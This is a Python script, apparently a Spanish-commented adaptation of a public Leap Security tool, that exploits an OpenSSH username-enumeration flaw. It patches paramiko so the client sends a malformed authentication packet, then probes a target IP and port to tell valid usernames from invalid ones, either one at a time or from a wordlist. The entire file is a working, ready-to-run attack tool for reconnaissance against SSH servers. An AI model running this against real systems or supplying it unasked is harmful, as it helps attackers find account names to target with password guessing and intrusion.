#!/usr/bin/env python3

import argparse
import logging
import paramiko
import socket
import sys
import os

class InvalidUsername(Exception):
    pass

# Validación para versiones modernas de Paramiko
if hasattr(paramiko.auth_handler.AuthHandler, "_client_handler_table"):
    _client_handler_table = paramiko.auth_handler.AuthHandler._client_handler_table
else:
    _client_handler_table = {}

# Malicious function to malform packet
def add_boolean(*args, **kwargs):
    pass

# Validación para MSG_SERVICE_ACCEPT
MSG_SERVICE_ACCEPT = getattr(paramiko.common, "MSG_SERVICE_ACCEPT", 6)
MSG_USERAUTH_FAILURE = getattr(paramiko.common, "MSG_USERAUTH_FAILURE", 51)

# función original a sobrescribir
old_service_accept = _client_handler_table.get(MSG_SERVICE_ACCEPT, None)

# Si no existe, se evita el error
if old_service_accept:
    def service_accept(*args, **kwargs):
        old_add_boolean = paramiko.message.Message.add_boolean
        paramiko.message.Message.add_boolean = add_boolean
        result = old_service_accept(*args, **kwargs)
        paramiko.message.Message.add_boolean = old_add_boolean
        return result

    # Sobrescribir handlers
    _client_handler_table[MSG_SERVICE_ACCEPT] = service_accept
    _client_handler_table[MSG_USERAUTH_FAILURE] = lambda *args, **kwargs: (_ for _ in ()).throw(InvalidUsername())

# Mostrar resultados
def print_result(valid_users):
    if valid_users:
        print("\n[+] Valid Users:")
        for user in valid_users:
            print(f" - {user}")
    else:
        print("\n[-] No valid user detected.")

# Intentar autenticación con usuario malformado
def check_user(username):
    try:
        sock = socket.socket()
        sock.connect((args.target, int(args.port)))
        transport = paramiko.Transport(sock)
        transport.start_client(timeout=0.5)
    except paramiko.ssh_exception.SSHException:
        print('[!] Failed to negotiate SSH transport')
        sys.exit(2)

    try:
        transport.auth_publickey(username, paramiko.RSAKey.generate(2048))
    except paramiko.ssh_exception.AuthenticationException:
        print(f"[+] {username} is a valid username")
        return True
    except:
        print(f"[-] {username} is an invalid username")
        return False

# Cargar lista de usuarios desde wordlist
def check_userlist(wordlist_path):
    if os.path.isfile(wordlist_path):
        valid_users = []
        with open(wordlist_path) as f:
            for line in f:
                username = line.strip()
                try:
                    if check_user(username):
                        valid_users.append(username)
                except KeyboardInterrupt:
                    print("\n[!] Enumeration aborted by user!")
                    break

        print_result(valid_users)
    else:
        print(f"[-] {wordlist_path} is an invalid wordlist file")
        sys.exit(2)

# Configuración del logger de paramiko
logging.getLogger('paramiko.transport').addHandler(logging.NullHandler())

# Definición de argumentos CLI
parser = argparse.ArgumentParser(description="SSH User Enumeration by Leap Security (@LeapSecurity)")
parser.add_argument("target", help="IP address of the target system")
parser.add_argument("-p", "--port", default=22, help="Set port of SSH service")
parser.add_argument("-u", "--user", dest="username", help="Username to check for validity.")
parser.add_argument("-w", "--wordlist", dest="wordlist", help="Username wordlist")

if len(sys.argv) == 1:
    parser.print_help()
    sys.exit(1)

args = parser.parse_args()

if args.wordlist:
    check_userlist(args.wordlist)
elif args.username:
    check_user(args.username)
else:
    print("[-] Username or wordlist must be specified!\n")
    parser.print_help()
    sys.exit(1)
